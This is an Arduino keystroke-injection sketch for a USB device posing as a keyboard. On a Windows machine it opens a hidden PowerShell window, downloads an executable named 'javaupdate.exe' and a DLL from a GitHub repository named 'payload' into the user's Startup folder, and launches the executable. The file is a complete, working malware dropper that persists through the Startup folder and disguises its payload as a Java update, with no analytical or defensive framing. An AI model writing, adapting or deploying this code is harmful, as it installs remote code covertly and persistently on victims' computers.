#include <Keyboard.h>

void fastType(const char* text) {
  while (*text) {
    Keyboard.write(*text++);
    delay(1); // Fast typing
  }
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(50); // Minimal pause between commands
}

void setup() {
  delay(1500);  // Initial delay to ensure OS is ready
  Keyboard.begin();

  // Open Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(300);

  // Launch PowerShell hidden
  fastType("powershell -WindowStyle Hidden");
  delay(600); // Give shell a moment to open

  // Define download URLs and target path
  fastType("$s=$env:APPDATA+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'");
  fastType("Invoke-WebRequest 'https://raw.githubusercontent.com/proee948/payload/main/javaupdate.exe' -OutFile ($s+'javaupdate.exe')");
  fastType("Start-Sleep -Seconds 1");
  fastType("Invoke-WebRequest 'https://raw.githubusercontent.com/proee948/payload/main/libcurl-x64.dll' -OutFile ($s+'libcurl-x64.dll')");
  fastType("Start-Process ($s+'javaupdate.exe')");

  delay(500);
  Keyboard.end();
}

void loop() {}


